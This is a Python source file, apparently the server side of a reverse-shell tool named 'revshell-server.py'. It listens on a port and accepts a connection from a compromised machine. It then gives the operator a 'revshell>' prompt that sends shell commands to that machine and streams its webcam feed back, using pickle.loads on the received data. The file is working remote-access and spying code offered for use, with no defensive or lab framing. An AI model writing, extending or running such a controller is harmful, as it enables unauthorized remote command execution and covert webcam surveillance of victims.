import socket
import sys
import os
import signal
import cv2
import pickle
import struct
import imutils

# Intended to read any buffer size soon
BUFFER_SIZE = 1024 * 128

# Still not very stable, need a way to stop
# that thing and handle exceptions in case client
# SIGINTs

class WebcamStream:
	def __init__(self, client_socket):
		self.client_socket = client_socket

	def receive(self):
		print("Starting receiving")
		data = b""
		payload_size = struct.calcsize("Q")
		while True:
			while len(data) < payload_size:
				packet = self.client_socket.recv(4 * 1024)
				if not packet:
					break
				data += packet
			packed_msg_size = data[:payload_size]
			data = data[payload_size:]
			msg_size = struct.unpack("Q", packed_msg_size)[0]
			while len(data) < msg_size:
				data += self.client_socket.recv(4 * 1024)
			frame_data = data[:msg_size]
			data = data[msg_size:]
			frame = pickle.loads(frame_data)
			cv2.imshow('Sender', frame)
			key = cv2.waitKey(10)
			if key == 13:
				return


class Shell:
	def __init__(self, client_socket):
		self.client_socket = client_socket

	def start(self):
		while(True):
			try:
				cmd = input("$> ")
			except EOFError:
				print("")
				return
			cmd = cmd.strip()
			if not cmd:
				continue
			self.client_socket.send(cmd.encode())
			if cmd == 'exit':
				break
			out = self.client_socket.recv(BUFFER_SIZE).decode().strip()
			print(out)

def main_loop(client_socket):
	while True:
		try:
			cmd = input("revshell> ")
		except EOFError:
			print("")
			return
		if not cmd:
			return
		cmd = cmd.strip()
		if not cmd:
			continue
		if cmd == "shell":
			# client_socket.send(cmd.encode())
			shell = Shell(client_socket)
			shell.start()
		elif cmd.split()[0] == "webcam":
			client_socket.send(cmd.encode())
			webcam = WebcamStream(client_socket)
			webcam.receive()
		elif cmd == "exit":
			return

def sigIntHandler(signum, frame):
	print("\nrevshell> ", end="")

def main(PORT):
	HOST = '0.0.0.0'

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.bind((HOST, PORT))
	s.listen()
	print(f"Listening on {HOST}:{PORT} ...")
	client_socket, client_ip = s.accept()
	print(f"[+] Connection from {client_ip[0]}:{client_ip[1]}")
	signal.signal(signal.SIGINT, sigIntHandler)
	main_loop(client_socket)

	s.close()
	

if __name__ == '__main__':
	if len(sys.argv) != 2:
		print("Usage: python3 revshell-server.py <port>")
		exit(1)
	main(int(sys.argv[1]))